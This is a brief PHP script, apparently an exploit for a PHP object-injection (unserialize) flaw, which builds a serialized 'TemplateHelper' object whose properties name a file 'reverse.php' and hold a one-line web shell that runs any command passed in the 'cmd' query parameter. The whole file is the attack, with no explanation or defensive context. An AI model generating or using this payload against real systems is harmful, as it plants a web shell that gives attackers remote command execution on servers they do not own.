<?php

class TemplateHelper
{

    public $file;
    public $data;

    public function __construct()
    {
        $this->file = 'reverse.php';
        $this->data = '<?php system($_GET["cmd"]); ?>';
    }

}

$obj = new TemplateHelper();
echo serialize($obj);

?>